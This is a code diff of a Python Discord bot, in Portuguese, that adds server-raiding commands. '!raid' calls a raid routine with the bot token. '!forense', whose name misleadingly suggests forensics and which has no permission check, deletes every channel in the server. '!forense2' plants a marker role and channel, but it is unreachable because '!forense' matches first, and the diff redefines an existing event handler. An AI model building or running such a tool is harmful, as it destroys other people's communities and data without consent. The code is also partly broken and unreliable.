@@ -176,9 +176,7 @@ def comando_input():
             print("Encerrando comando input...")
             break
         elif cmd.lower() == "!raid":
-            # Comando de raid
             print("Tentando executar raid...")
-            # O comando será tratado pelo evento do discord
             print("Envie a mensagem '!raid' no servidor para ativar o raid.")
         else:
             print("Comando não reconhecido.")
@@ -251,7 +249,54 @@ async def on_message(message):
         await raid_server(guild, client.http.token)
 
 # =========================
-# 📋 MENU PRINCIPAL
+# =========================
+# Comandos do bot: forense e forense2
+# =========================
+@client.event
+async def on_ready():
+    print(f'Logado como {client.user}')
+    # Aqui podemos também registrar comandos ou qualquer configuração ao iniciar
+
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+    # Comando para iniciar raid
+    if message.content.startswith("!raid"):
+        perms = message.author.guild_permissions
+        if not perms.manage_channels:
+            await message.channel.send("Você não tem permissão para fazer isso.")
+            return
+        await message.channel.send("Iniciando raid...")
+        await raid_server(message.guild, client.http.token)
+    # Comandos forense
+    elif message.content.startswith("!forense"):
+        guild = message.guild
+        await message.delete()
+        for canal in guild.channels:
+            try:
+                await canal.delete()
+            except:
+                pass
+        await message.channel.send("Canais deletados!")
+    elif message.content.startswith("!forense2"):
+        guild = message.guild
+        await message.delete()
+        # Criar cargo
+        role_name = "crystalxforense"
+        existing_roles = [role for role in guild.roles if role.name == role_name]
+        if not existing_roles:
+            await guild.create_role(name=role_name)
+        # Criar canal
+        channel_name = "crystalxforense"
+        existing_channels = [ch for ch in guild.channels if ch.name == channel_name]
+        if not existing_channels:
+            await guild.create_text_channel(name=channel_name)
+        await message.channel.send("Cargos e canais criados!")
+
+# =========================
+# =========================
+# MENU PRINCIPAL
 # =========================
 def menu():
     while True:
